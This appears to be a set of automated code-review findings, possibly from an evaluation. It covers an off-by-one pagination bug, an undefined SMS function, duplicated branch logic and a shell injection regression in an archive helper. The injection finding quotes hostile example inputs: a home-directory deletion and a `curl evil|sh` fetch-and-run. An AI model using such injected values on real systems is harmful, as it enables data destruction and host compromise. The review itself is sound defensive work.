produced_findings.claim: Page slice returns one item too many `end = offset + page_size + 1` makes the slice `items[offset:offset + page_size + 1]`, which is `page_size + 1` elements. The pre-image used `offset + page_size`. For `items=[1..10]`, `page_number=1`, `page_size=3`, the function returns `[1, 2, 3, 4]`. Page 2 starts at offset 3 and returns `[4, 5, 6, 7]`, so item 4 appears on both pages. Every non-final page returns more rows than requested. Consecutive pages duplicate a boundary item, and callers that rely on `len(page) == page_size` break. This corrupts any listing or API that uses this helper.

`send_sms` is undefined, so the SMS path raises `NameError` `send_sms` is called on line 7. The repository has one tracked file, `app/notify.py`. A search of the working tree finds no `def send_sms`, no import and no other reference. `format_message` and `send_email` are also undefined or unimported there, but this delta did not introduce them. `notify(user, "sms")` raises `NameError` at runtime instead of sending a message. The new feature cannot work as submitted, and the failure surfaces only when the SMS path runs.

Duplicated branch logic in `notify` The `sms` branch copies the `email` branch (lines 2-4). Both build `msg = format_message(user)`, then call a channel-specific sender. Only the recipient attribute and the sender differ. Each new channel adds another copy of the message-building step. Changes to message construction, such as per-channel formatting or error handling, must be made in every branch, which invites drift.

Shell command injection via `name` in `make_archive` `name` is interpolated unquoted into a string passed to `subprocess.run(..., shell=True)`, so the shell parses it. A value such as `x; rm -rf ~ #` or `$(curl evil|sh)` runs as a command. The previous list-form call passed `name` as a single argv element with no shell. `name` is the function's only parameter, and the repository gives no sanitization or allow-listing of it. `make_archive` has no callers in the repo, so the review could not check what feeds `name`. For a public backup helper, treat the value as untrusted. Any caller that passes user-influenced input, such as a request parameter, job name or filename, gives an attacker code execution with the process's privileges. That means arbitrary file read, write or deletion and a path to full host compromise. The change also turns safe argv handling into an exploitable path, which is a regression.
